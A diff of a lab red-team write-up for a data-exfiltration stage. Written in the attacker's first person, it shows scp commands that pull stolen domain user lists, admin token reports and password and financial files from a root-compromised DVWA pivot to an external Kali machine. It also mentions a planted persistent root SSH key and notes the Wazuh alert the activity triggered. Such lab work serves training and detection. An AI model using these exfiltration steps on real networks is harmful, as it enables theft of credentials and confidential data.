@@ -7,7 +7,7 @@
 
 ## Objective
 
-Exfiltrate the harvested domain intelligence, administrative token dumps, and confidential endpoint documents from the intermediate Linux pivot host (DVWA) out of the enterprise perimeter to the attacker's external command-and-control system using Secure Copy Protocol (SCP) over an encrypted SSH channel.
+Exfiltrate the harvested domain users, administrative token dumps, and sensitive corporate files from our DVWA pivot host out of the enterprise perimeter to our external Kali machine using SCP over an encrypted SSH connection.
 
 ## Commands
 
@@ -25,16 +25,13 @@ scp root@192.168.56.30:/tmp/sensitive_data.txt /tmp/
 
 ## What happened
 
-Following the successful collection and staging of intelligence from both the Domain Controller and the Windows 10 workstation in Stage 18, the attacker prepared to transfer the staged files off the enterprise network. The consolidated artifacts resided in the `/tmp` directory of the dual-homed DVWA pivot server (`192.168.56.30`), which previously had root-level SSH access established during Stage 08.
+With all stolen intelligence staged in `/tmp` on the DVWA pivot (`192.168.56.30`), the final data movement was pulling it across the perimeter onto our external Kali attack machine (`192.168.232.135`):
 
-Operating directly from the external attacker command station (`Kali Linux`, IP `192.168.232.135`), the adversary leveraged `scp` (Secure Copy Protocol) over TCP port 22 to pull the staged intelligence files across the network boundary into the attacker's local `/tmp` directory.
-
-The exfiltration was performed in three sequential operations:
-1. `scp root@192.168.56.30:/tmp/domain_users.txt /tmp/`: Transferred the complete Active Directory domain user roster (63 KB) at 6.9 MB/s.
-2. `scp root@192.168.56.30:/tmp/admin_info.txt /tmp/`: Transferred the administrative privilege, SID, and group context report (6,522 bytes) at 1.2 MB/s.
-3. `scp root@192.168.56.30:/tmp/sensitive_data.txt /tmp/`: Transferred the aggregated confidential corporate records (`financials.txt` and `passwords.txt`, 31 bytes) at 8.9 KB/s.
-
-Each `scp` invocation spawned an authenticated SSH session on the DVWA host. While the SSH encryption enveloped the payload, preventing deep packet inspection devices from reading the file contents in transit, the clustered authentication attempts and outbound data flow generated distinct host-level security telemetry.
+1. **Pulling the files over SCP:** Using the persistent root SSH key we planted in Stage 08, I ran three sequential `scp` commands from Kali:
+   - `scp root@192.168.56.30:/tmp/domain_users.txt /tmp/`: Transferred the entire domain user list (63 KB).
+   - `scp root@192.168.56.30:/tmp/admin_info.txt /tmp/`: Transferred the full administrative token and privilege report (6.5 KB).
+   - `scp root@192.168.56.30:/tmp/sensitive_data.txt /tmp/`: Transferred the consolidated corporate records and stored credentials (`financials.txt` and `passwords.txt`).
+2. **Encrypted transit vs. host detection:** Because all transfers happened over SSH, the file contents were completely encrypted in transit, meaning network intrusion signatures looking for plaintext keywords ('passwords', 'financials') saw nothing on the wire. However, the flurry of 6 rapid root SSH logins within 574 milliseconds triggered Wazuh Rule 5715 on DVWA, which alerted in TheHive (Alert #37).
 
 ## Evidence
 
